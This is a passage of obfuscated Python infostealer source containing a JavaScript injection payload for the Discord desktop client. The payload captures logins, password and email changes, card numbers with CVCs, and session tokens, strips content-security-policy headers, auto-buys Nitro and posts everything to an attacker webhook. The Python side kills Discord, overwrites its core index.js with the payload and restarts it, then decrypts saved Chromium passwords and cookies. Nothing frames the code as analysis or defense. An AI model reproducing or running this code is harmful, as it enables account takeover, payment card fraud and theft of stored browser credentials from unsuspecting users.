        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def JNHZPSGUGLRWZWAUGKMMYSGZAXSXYBQOUDVICHCROEZSPWLTRXNCJZVVFFOWPRGVY():
    import os
    import re
    import subprocess
    import psutil

    def ADZTYZZNEWNCOCZOGQJQOQYQZEAOJHXTRBWIINLTVQALVICXKWMLMVDTXKLBBXSNPSVPLHGOUJBE(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN):
        for v4r_file in os.listdir(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN):
            if re.search(r'app-+?', v4r_file):
                KLWHEDHECOVZORFTBBRTZONMKVSSNNTHUTZXCDQUQJWWKDDISNIYGJKHNQHZUHZUEUBYVZRZETHGSHIVEIOVIXLGW = RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN + '\\' + v4r_file + '\\modules'
                if not os.path.exists(KLWHEDHECOVZORFTBBRTZONMKVSSNNTHUTZXCDQUQJWWKDDISNIYGJKHNQHZUHZUEUBYVZRZETHGSHIVEIOVIXLGW):
                    continue
                for v4r_file in os.listdir(KLWHEDHECOVZORFTBBRTZONMKVSSNNTHUTZXCDQUQJWWKDDISNIYGJKHNQHZUHZUEUBYVZRZETHGSHIVEIOVIXLGW):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN = KLWHEDHECOVZORFTBBRTZONMKVSSNNTHUTZXCDQUQJWWKDDISNIYGJKHNQHZUHZUEUBYVZRZETHGSHIVEIOVIXLGW + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN, v4r_file
        return None

    def ZZHECMYFKEICROKBPZPWHRWZKBGTRWPRLLEXZGQDILLXQBVCYFKYZVFNO(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN):
        GYYSRTUHDTVALBHDYMJSZZJUHUIMQWJNJEZMLGSMNJNXZKTFPQYMCQYVBLVGLQACNFOYGECQKXY = RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN + '\\Update.exe'
        GRHZLSCKKFDDPBXFEUNREGBYDWJLOWTZORXUYIORBOIZRRGUPZJZXMIWYWTWOWSSYDFZNGGCDAPRYMR = RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN):
            if re.search(r'app-+?', v4r_file):
                WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZ = RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN + '\\' + v4r_file
                if os.path.exists(WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZ + '\\' + 'modules'):
                    for v4r_file in os.listdir(WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZ):
                        if v4r_file == GRHZLSCKKFDDPBXFEUNREGBYDWJLOWTZORXUYIORBOIZRRGUPZJZXMIWYWTWOWSSYDFZNGGCDAPRYMR:
                            GRHZLSCKKFDDPBXFEUNREGBYDWJLOWTZORXUYIORBOIZRRGUPZJZXMIWYWTWOWSSYDFZNGGCDAPRYMR = WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZ + '\\' + GRHZLSCKKFDDPBXFEUNREGBYDWJLOWTZORXUYIORBOIZRRGUPZJZXMIWYWTWOWSSYDFZNGGCDAPRYMR
                            subprocess.call([GYYSRTUHDTVALBHDYMJSZZJUHUIMQWJNJEZMLGSMNJNXZKTFPQYMCQYVBLVGLQACNFOYGECQKXY, '--processStart', GRHZLSCKKFDDPBXFEUNREGBYDWJLOWTZORXUYIORBOIZRRGUPZJZXMIWYWTWOWSSYDFZNGGCDAPRYMR],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def YXGNOKVIIQQTNGJLQIRNUAOPFEPVIZDMVDLZTCMOWCULVCCTWNSX():
        WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZdata = os.getenv('LOCALAPPDATA')
        NEZBIOWOZMYERHELEMNMESCXCCDZRJDGBVQMFDFJUGNUHINPSSMWBKHVMAQFCPMZELEEMGHP = [
            WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZdata + '\\Discord',
            WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZdata + '\\DiscordCanary',
            WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZdata + '\\DiscordPTB',
            WTFBCBKTIQVMNDKMGABTYNUATEGAYUPDKUWYSHDQYNNGKLKBUEOJBWBYQULZdata + '\\DiscordDevelopment'
        ]
        UKFFZKLOUYWZUHLHECBUMGWIMGDTUGHEDOVYHQIRDPKUHDRGVHWARXGEBFOSMEZEYAOXJNERZRRDPYLUBGQ = SKFNPTRGCKOCNHXVXOHEVOICXGMWIWHXSXJNTVLIDDNUSEGJAAQJB

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN in NEZBIOWOZMYERHELEMNMESCXCCDZRJDGBVQMFDFJUGNUHINPSSMWBKHVMAQFCPMZELEEMGHP:
            if not os.path.exists(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN):
                continue

            RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN_info = ADZTYZZNEWNCOCZOGQJQOQYQZEAOJHXTRBWIINLTVQALVICXKWMLMVDTXKLBBXSNPSVPLHGOUJBE(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN)
            if RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN_info is not None:
                RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN, RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN_file = RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN_info
                
                PGHPMNBTUZBPDDRFHRDEPPOISAFTBCVTFCILGJJCBHYZIXIGAWVFGMVTIYXKDSLYSSBLUGPXGQQHDMRNBKISEMXEAGOUV = RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN + '\\index.js'
                
                if not os.path.exists(PGHPMNBTUZBPDDRFHRDEPPOISAFTBCVTFCILGJJCBHYZIXIGAWVFGMVTIYXKDSLYSSBLUGPXGQQHDMRNBKISEMXEAGOUV):
                    open(PGHPMNBTUZBPDDRFHRDEPPOISAFTBCVTFCILGJJCBHYZIXIGAWVFGMVTIYXKDSLYSSBLUGPXGQQHDMRNBKISEMXEAGOUV, 'w').close()

                with open(PGHPMNBTUZBPDDRFHRDEPPOISAFTBCVTFCILGJJCBHYZIXIGAWVFGMVTIYXKDSLYSSBLUGPXGQQHDMRNBKISEMXEAGOUV, 'w', encoding='utf-8') as f:
                    f.write((UKFFZKLOUYWZUHLHECBUMGWIMGDTUGHEDOVYHQIRDPKUHDRGVHWARXGEBFOSMEZEYAOXJNERZRRDPYLUBGQ).replace('discord_desktop_core-1', RHBGJYVDQFJJXXRYVFGFFIZBDHJYAAPGOZLHKXCGLPRUMHAGXNFSNTWBQKIN_file)
                            .replace(r"%WEBHOOK_HERE%", TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)
                            .replace(r"%EMBED_COLOR%", str(UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG))
                            .replace(r"%USERNAME%", IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB)
                            .replace(r"%IP_PUBLIC%", TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ)
                            .replace(r"%EMBED_NAME%", PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU)
                            .replace(r"%EMBED_ICON%", CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
                            .replace(r"%FOOTER_TEXT%", ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG)
                            .replace(r"%WEBSITE%", HHEMARVZDKRORFUTDGWXWMQGDFLDUVHIIXUAKAEOPFFNONWLWYGCQRDZAHVETTBXBZNSYIEPEMZQYLNMRCGAT))
                ZZHECMYFKEICROKBPZPWHRWZKBGTRWPRLLEXZGQDILLXQBVCYFKYZVFNO(RJCHQLNCDIPWTQXAQVCROWJMZLXHSUGGRIIIQXIHIDOOACBLYUPROLHPMUCBZHEN)
    YXGNOKVIIQQTNGJLQIRNUAOPFEPVIZDMVDLZTCMOWCULVCCTWNSX()

def NSLCUKVKYXSWKWPWEPIEDWEAWNQQRZAOYIALBFTYBFWLTUZJIPQIXRHD():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV = []
    RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN = []
    ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL = []
    FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS = []
    STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU = []
    BYMKWZNUWYYMBUCCMKXQFSUFWXRWVTVSHDZEIMWVAOTEXJUAZRSQXMLXQXIOODD = []

    def ZFPVMANUTMOYTDDVMJTKENPILZFXGYPKDUIKLABQIPKMNJWTPYAESWQLDXDYA(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
        if not os.path.exists(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD):
            return None

        try:
            with open(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD, 'r', encoding='utf-8') as v4r_f:
                BYDOTCOTBGLOUWPGVLMKWSTQDXYOZEWYEXCMABNQUQPNBJLDYXRARUBHJAHKXPXTJHXWKTVIPYAGSEXBZOXMFHWITHVJEZFMYB = json.load(v4r_f)

            FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_key = base64.b64decode(BYDOTCOTBGLOUWPGVLMKWSTQDXYOZEWYEXCMABNQUQPNBJLDYXRARUBHJAHKXPXTJHXWKTVIPYAGSEXBZOXMFHWITHVJEZFMYB["os_crypt"]["encrypted_key"])[5:]
            DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD = win32crypt.CryptUnprotectData(FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_key, None, None, None, 0)[1]
            return DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD
        except:
            return None

    def MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD):
        try:
            SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH = BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES[3:15]
            NMODAGUUVDVSEMCDHJNGQCMZNBRRQKIKDMHQKXSNCKMEMJACFBXQZEEKAEWO = BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES[15:-16]
            UQCIJSCNUNWTFDTROHKFTYGBZVPXMUJHRTKYXNMOTVXWLZCLCZSEIVAOXCARTXYDZRHWKWQNJGYLKH = BOPCKRXQPVTOHRVJDVKFZGZNKWAMNRTZWMQFSMHOGUKLPUGEQSJPJJDRQVTNOYFTBLVAJQBCSVTWHFAWQLLJWEDQNDOKES[-16:]
            LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA = Cipher(algorithms.AES(DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD), modes.GCM(SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH, UQCIJSCNUNWTFDTROHKFTYGBZVPXMUJHRTKYXNMOTVXWLZCLCZSEIVAOXCARTXYDZRHWKWQNJGYLKH))
            VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS = LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA.decryptor()
            OWQLXSMBXYTTJFQQNEZPUMPRJRVZUCDYPEWYVKEKNHLLEBKVDEWICTLFIFZQPYBVYZJKPRRKIVJQEXAQPZKJVENSRIBCNETR = VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS.update(NMODAGUUVDVSEMCDHJNGQCMZNBRRQKIKDMHQKXSNCKMEMJACFBXQZEEKAEWO) + VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS.finalize()
            return OWQLXSMBXYTTJFQQNEZPUMPRJRVZUCDYPEWYVKEKNHLLEBKVDEWICTLFIFZQPYBVYZJKPRRKIVJQEXAQPZKJVENSRIBCNETR.decode()
        except:
            return None
        
    def XEBDSYSNOLBNSKYIZLKJDGRKXXVVEJSNSNPUGZJFRXSHBAMETATQSAMHDCKIBXTBEMKDHJQZWIZQYDCXUM(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD):
        ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP_db = os.path.join(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, 'Login Data')
        if not os.path.exists(ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP_db):
            return

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP_db)
        disk_conn.backup(WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ)
        disk_conn.close()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ = WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.cursor()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ =          f"- Url      : {v4r_row[0]}"
            QAMANENOXXWUTKQDWMSPUNQKVBVDFUBSFICKYDNKIFDSZXHYKUHBJNXQBYQPZNWRN =     f"  Username : {v4r_row[1]}"
            ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP =     f"  Password : {MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(v4r_row[2], DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)}"
            KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name = f"  Browser  : {KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD}"
            XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV.append(f"{YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ}\n{QAMANENOXXWUTKQDWMSPUNQKVBVDFUBSFICKYDNKIFDSZXHYKUHBJNXQBYQPZNWRN}\n{ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP}\n{KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD_name}\n")

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.close()

    def HZXFERUHLACBMGOUQJOIGEBUNXBIOWSTUGXIZZPUFWGUOXKQLQBOGQGFIOVIAOZFAFLSVLI(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD):
        CUVOXGWFEOOQPEHNFJCITAUFPKSAZHXDWMSEYHGKYDVPXRONLERILNDQSCBQZ = os.path.join(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, 'Network', 'Cookies')
        if not os.path.exists(CUVOXGWFEOOQPEHNFJCITAUFPKSAZHXDWMSEYHGKYDVPXRONLERILNDQSCBQZ):
            return

        WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(CUVOXGWFEOOQPEHNFJCITAUFPKSAZHXDWMSEYHGKYDVPXRONLERILNDQSCBQZ)
        disk_conn.backup(WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ)
        disk_conn.close()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ = WYEZFGPSTSNJWICPSIPWGTEGLLIZMTRIPXUQEJQMQBWQHRTFXAFVLNHOGFAWZHBJGBXATGEERJZGXFSWGRCFQ.cursor()
        OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in OCAGULKQUGBBJAHYPEHAEQQARPPGJNAWLPZVPIOWJSLGSOTXKVMFOKCFUMIPNNQTRZIGJCRFJYMBTXDOXTXGGUIVBXJIJ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            YIZOUKZADOLKYDCEPNCRKPBKJRKQCVLXRRMQYXZYFTJJPPRJBPUVIYNFRLAMVRPRWNQCKWMUWQMXVRHJSPABZSTHQ =          f"- Url     : {v4r_row[0]}"
            EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL =         f"  Name    : {v4r_row[1]}"
            VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD =         f"  Path    : {v4r_row[2]}"
            KQXBXJKNTJFZFPJWHLMBPUNMVDCQCFHIPVGJHWUZVBZHYYMZPINWKGNJHCEHIJXHIYSUWEVTFNFNALLKNBZFZXJXNMZU =       f"  Cookie  : {MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(v4r_row[3], DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)}"
            OCFUQGVELAMDGLPCOCQVZNYNFLZYLHMZNAFDLAQBFSMJMMLGVXFTSHVWTISGZRIGLUUWXVOVT =       f"  Expire  : {v4r_row[4]}"
